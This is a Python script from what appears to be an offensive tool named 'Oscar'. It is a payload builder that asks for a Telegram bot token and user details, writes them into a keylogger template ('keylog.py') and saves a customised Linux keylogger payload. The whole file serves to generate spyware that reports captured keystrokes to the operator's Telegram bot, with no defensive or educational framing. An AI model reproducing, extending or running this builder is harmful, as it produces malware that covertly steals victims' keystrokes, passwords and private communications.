#!/usr/local/bin/python3

import subprocess
import platform,os
from modules import banner
from colorama import *
import time

def sh_payload():

    time.sleep(0.2)

    banner.Oscar_Banner()

    try:


        print(Back.BLACK+Fore.RED+ " Please Enter Payloads Name > For example : Ocar\n"+Style.RESET_ALL)

        get_payload_name = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get Name Payloads)" +Fore.LIGHTWHITE_EX+" > ")

        time.sleep(0.2)

        banner.Oscar_Banner()

        print(Back.BLACK+Fore.RED+ " Please Enter Bot Token Telegram \n"+Style.RESET_ALL)

        get_bot_token = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get Bot Token)" +Fore.LIGHTWHITE_EX+" > ")
        
        time.sleep(0.2)

        banner.Oscar_Banner()
        
        print(Back.BLACK+Fore.RED+ " Please Enter User Info \n"+Style.RESET_ALL)

        get_user_info = input(Fore.LIGHTWHITE_EX+" Oscar"+Fore.RED+" (Get User Info)" +Fore.LIGHTWHITE_EX+" > ")



        payload_data = open("Payload-sh/keylog.py","r").read().replace("TOKEN",f"'{get_bot_token}'").replace("USERINFO",f"'{get_user_info}'")

        new_file = open(f"Payload-sh/{get_payload_name}.py","w")
        new_file.write(payload_data)
        new_file.close()

        time.sleep(0.2)

        banner.Oscar_Banner()
        
        print(Fore.LIGHTYELLOW_EX+" Please Wait ...")

        time.sleep(5)

        print(Fore.RED+"\n We can only provide you the source code for the Linux part,and you are responsible for compiling the payload :(")

        print(Fore.LIGHTMAGENTA_EX+"\n Your Payload Generated In The /Oscar/Payload-sh/"+get_payload_name+".py")  
        input(Fore.CYAN+ "\n Back To The Menu ( Press Enter ... ) ")
    
    except Exception as ex:
        print(ex)
        input()
